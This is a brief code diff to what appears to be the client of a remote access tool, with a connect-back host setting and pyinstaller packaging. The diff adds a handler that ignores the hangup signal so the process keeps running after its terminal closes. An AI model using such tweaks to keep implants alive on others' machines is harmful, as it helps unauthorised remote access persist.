@@ -64,6 +64,7 @@ import logging
 import shlex
 import marshal
 import zlib
+import signal
 
 try:
     # additional imports needed to package with pyinstaller
@@ -285,6 +286,9 @@ def set_connect_back_host(HOST):
 def handle_sigchld(*args, **kwargs):
     os.waitpid(-1, os.WNOHANG)
 
+def handle_sighup(*args):
+    pass
+
 attempt = 0
 
 def main():
@@ -292,6 +296,9 @@ def main():
     global LAUNCHER_ARGS
     global debug
     global attempt
+
+    if hasattr(signal, 'SIGHUP'):
+        signal.signal(signal.SIGHUP, handle_sighup)
 
     if len(sys.argv) > 1:
         parser = argparse.ArgumentParser(
